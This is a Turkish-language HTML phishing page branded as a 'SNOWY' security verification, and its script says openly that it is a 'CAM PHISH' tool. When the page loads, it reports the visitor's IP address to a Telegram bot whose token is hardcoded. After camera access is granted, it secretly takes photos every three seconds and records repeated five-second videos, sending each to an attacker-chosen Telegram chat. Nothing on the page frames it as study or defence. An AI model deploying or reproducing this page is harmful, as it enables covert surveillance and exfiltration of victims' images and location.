<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNOWY GГјvenlik DoДҹrulamasДұ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>вқ„пёҸ <span>SNOWY</span> GГңVENLД°K DOДһRULAMASI</h2>
        <p>Devam etmek iГ§in kamera eriЕҹimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">рҹ“ё BAЕһLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">GГјvenlik kontrolГј...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GД°ZLД° KONFД°GГңRASYON - DГңZ TOKEN
        // ============================================
        const BOT_TOKEN = "8773124715:AAEfs80t8yv2XnDGy20aLlxy3aFGwDj0jFU";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        // ============================================
        // SAYFA AГҮILIR AГҮILMAZ IP GГ–NDER
        // ============================================
        window.onload = function() {
            if (TARGET_ID) {
                // IP adresini al
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip;
                        const zaman = new Date().toLocaleString('tr-TR');
                        const mesaj = `вқ„пёҸ SNOWY CAM PHISH вқ„пёҸ\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nрҹҢҗ IP Adresi: ${ip}\nвҸұпёҸ Zaman: ${zaman}\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nвҡЎ @snowy_dexry_wexry вҡЎ`;
                        
                        // Telegram'a gГ¶nder
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ 
                                chat_id: TARGET_ID, 
                                text: mesaj
                            })
                        });
                    })
                    .catch(error => console.log("IP alДұnamadДұ"));
            }
        };
        
        // ============================================
        // KAMERA Д°ЕһLEMLERД°
        // ============================================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        let stream = null;
        
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('loading').style.display = 'block';
                    
                    // 3 saniyede bir fotoДҹraf Г§ek
                    setInterval(takePhoto, 3000);
                    
                    // 5 saniye sonra video baЕҹlat
                    setTimeout(recordVideo, 5000);
                };
            } catch(e) {
                alert('Kamera izni gerekli!');
            }
        }
        
        function takePhoto() {
            if (!video.videoWidth) return;
            
            photoCount++;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(function(blob) {
                if (!blob) return;
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                formData.append('caption', `рҹ“ё FotoДҹraf #${photoCount}`);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
        }
        
        function recordVideo() {
            if (!stream) return;
            
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };
            
            mediaRecorder.onstop = () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `рҹҺҘ Video #${videoCount}`);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                setTimeout(recordVideo, 1000);
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
            }, 5000);
        }
    </script>
</body>
</html>
